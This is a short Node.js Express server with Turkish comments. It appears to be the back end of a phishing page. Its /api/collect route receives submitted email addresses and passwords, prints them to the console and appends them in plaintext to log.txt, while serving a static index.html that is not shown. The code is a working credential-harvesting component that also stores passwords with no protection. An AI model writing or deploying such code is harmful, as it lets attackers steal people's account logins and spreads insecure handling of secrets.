const express = require('express');
const app = express();
const port = 3000;

// JSON body parser
app.use(express.json());

// Statik dosyaları sun (index.html)
app.use(express.static('.'));

// API rotası
app.post('/api/collect', (req, res) => {
    const { email, password } = req.body;
    console.log(`E-posta: ${email}, Şifre: ${password}`);

    // Log dosyasına yaz
    const fs = require('fs');
    const logEntry = {
        timestamp: new Date().toISOString(),
        email,
        password
    };
    try {
        fs.appendFileSync('log.txt', JSON.stringify(logEntry) + '\n');
        res.status(200).json({ status: 'success', message: 'Bilgiler kaydedildi' });
    } catch (err) {
        console.error('Dosya yazma hatası:', err);
        res.status(500).json({ status: 'error', message: 'Log yazılamadı' });
    }
});

// Sunucuyu başlat
app.listen(port, () => {
    console.log(`Sunucu http://localhost:${port} adresinde çalışıyor`);
});